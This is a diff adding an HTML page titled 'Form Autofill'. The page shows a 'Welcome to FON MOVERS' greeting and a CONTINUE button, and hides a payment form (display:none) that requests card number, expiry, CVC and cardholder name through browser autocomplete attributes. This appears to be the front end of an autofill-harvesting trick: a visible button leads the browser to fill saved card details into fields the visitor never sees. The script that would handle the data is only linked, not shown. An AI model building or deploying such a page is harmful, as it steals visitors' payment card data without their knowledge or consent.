@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Autofill</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <h1>Welcome to FON MOVERS</h1> <!-- Welcome message -->
+        
+        <!-- Button to trigger autofill -->
+        <button id="fillSubmitButton">CONTINUE</button>
+
+        <!-- Hidden Form for autofill -->
+        <form id="paymentForm" style="display:none;">
+            <input type="text" name="cardNumber" id="cardNumber" autocomplete="cc-number" placeholder="Card Number">
+            <input type="text" name="expiryDate" id="expiryDate" autocomplete="cc-exp" placeholder="MM/YY">
+            <input type="text" name="cvc" id="cvc" autocomplete="cc-csc" placeholder="CVC/CVV">
+            <input type="text" name="cardNickname" id="cardNickname" autocomplete="cc-name" placeholder="Card Nickname">
+        </form>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
